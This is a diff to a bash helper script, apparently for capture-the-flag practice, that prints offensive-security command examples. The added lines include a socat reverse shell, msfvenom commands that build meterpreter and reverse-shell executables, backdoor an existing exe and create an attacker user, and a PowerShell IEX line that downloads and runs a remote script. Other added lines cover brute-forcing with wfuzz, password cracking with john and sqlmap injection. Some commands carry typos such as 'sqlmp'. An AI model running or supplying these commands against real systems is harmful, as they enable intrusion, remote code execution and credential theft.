@@ -1,8 +1,8 @@
 #!/bin/bash
-#TODO: reverse-shell/tcpdump/tshark/ssh/links
+#TODO: gdb/volatility/tcpdump/tshark/ssh/netcat/linux/recon-ng/links
 #
 # Can display examples for how commands are structured
-# Following commands can be used:
+# Following commands can be used
 #	- curl
 #	- hydra
 #	- nmap
@@ -24,6 +24,9 @@ option=$(tr '[:upper:]' '[:lower:]' <<< "$1")  # Convert command choice to lower
 if [[ $option == "-h" || $# != 1 ]]; then
 	echo "Usage: ctf-ex <CMD>
 Commands implemented
+	- linux
+	- msfvenom
+	- wfuzz
 	- reverse-shell
 	- nmap
 	- hydra
@@ -38,6 +41,31 @@ Commands implemented
 	- sqlmap
 	- smbclient.py
 	- mount"
+
+elif [[ $option == "linux" ]]; then
+	echo "enable logging record the interactive session
+	script <filename>
+close script session 
+	ctrl + D	
+check current shell
+	echo $0
+all details about system 
+	uname -a
+view all process
+	ps auxfww
+check open ports and services listening
+	netstat -anp
+check defined hosts	
+	cat /etc/hosts
+check filesystem
+	df -h
+check crontab
+	crontab -l
+check initab 
+	cat /etc/inittab
+check shared memory 
+	ipcs -mp
+	"	
 
 elif [[ $option == "crackmapexec" ]]; then
 	echo "Bruteforce smb
@@ -62,11 +90,20 @@ elif [[ $option == "tty" ]]; then
 	fg
 	export SHELL=bash
 	export TERM=xterm-256color
-	stty rows 24 columns 121"
+	stty rows 24 columns 121
+	Listner: socat file:`tty`,raw,echo=0 tcp-listen:4444
+	Victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444"
 
 elif [[ $option == "john" ]]; then
 	echo "Cracking hash
-	john --wordlist=/usr/share/wordlists/rockyou.txt hash_file"
+	john --wordlist=/usr/share/wordlists/rockyou.txt hash_file
+john the ripper, show the cracked passwords
+	john ~/hash.txt --show
+john the ripper, continue session
+	john --restore=session_name
+john the ripper over GPU, OpenCL formats, start session
+	john --session=session_name --format=opencl ~/hash.txt
+	"
 
 elif [[ $option == "mount" ]]; then
 	echo "Mount a shared folder
@@ -85,6 +122,8 @@ Finding all readable by user files
 	find / -type f -readable
 Finding all writable by user files
 	find / -type d -writable 
+Find all files with the word password in them 
+	find / -name '*{password}*' -print	
 	"
 
 elif [[ $option == "pwntools" ]]; then
@@ -127,6 +166,10 @@ Dump the contents of a DB table
 	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users –dump
 List all columns in a table
 	sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users --columns
+Test on page that require login	
+	sqlmp --cookie=\"value=X\" -u \"http://testsite.com/sell.php
+Add headers to the query 
+	sqlmp --headers=\"header:value;header:value\" -u \"http://testsite.com/sell.php
 	"
 elif [[ $option == "curl" ]]; then
 	echo "POST parameters
@@ -183,13 +226,10 @@ use diminutive fragmented IP packets
 Specify the size (need to be multiple of 16)
 	nmap --mtu 16 192.168.1.1
 use firewall bypass script
-	nmap -sS -T5 192.168.1.1 --script firewall-bypass		
-check more here: 
-	https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/
-	https://www.stationx.net/nmap-cheat-sheet/
-	https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/
-	https://dzone.com/articles/firewall-bypassing-techniques-with-nmap-and-hping3				
-"
+	nmap -sS -T5 192.168.1.1 --script firewall-bypass
+list nmap scripts
+	ls -la /usr/share/nmap/scripts/			
+	"
 elif [[ $option == "reverse-shell" ]]; then
 	echo "bash reverse-shell
 	bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
@@ -204,5 +244,39 @@ weevely web shell
 	weevely <URL> password
 "
 
- 
+elif [[ $option == "wfuzz" ]]; then 
+	echo "URL brute forcing
+	wfuzz -c -z /path/to/wordlist.txt --hc 404 http://<host>/FUZZ
+GET params brute forcing
+	wfuzz -c -z file,users.txt -z file,pass.txt --hc 404 http://<host>/index.php?user=FUZZ&pass=FUZ2Z
+POST params brute forcing 
+	wfuzz -z file,wordlist/others/common_pass.txt -d \"uname=FUZZ&pass=FUZZ\"  --hc 302 http://testphp.vulnweb.com/userinfo.php	
+Encoding payloads
+	wfuzz -z list,1-2-3,md5-sha1-none http://webscantest.com/FUZZ
+Fuzz custom headers
+	wfuzz -z file,wordlist/general/common.txt -H \"myheader: headervalue\" -H \"myheader2: headervalue2\" <URL> 
+	"
+
+elif [[ $option == "msfvenom" ]]; then 
+	echo "List payloads
+	msfvenom -l payloads
+List encoders
+	msfvenom -l encoders
+windows meterpreter reverse-shell
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
+windows create user
+	msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe		
+Execute commands 
+	msfvenom -a x86 --platform Windows -p windows/exec CMD=\"powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"\" -f python	
+Encoding a reverse-shell with shikata_ga_nai
+	msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
+embedded reverse-shell inside exe
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe		
+PHP reverse-shell
+	msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
+Python shell
+	msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py
+Linux meterpreter bind shell x86 multi stage
+	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf		
+	"		 
 fi
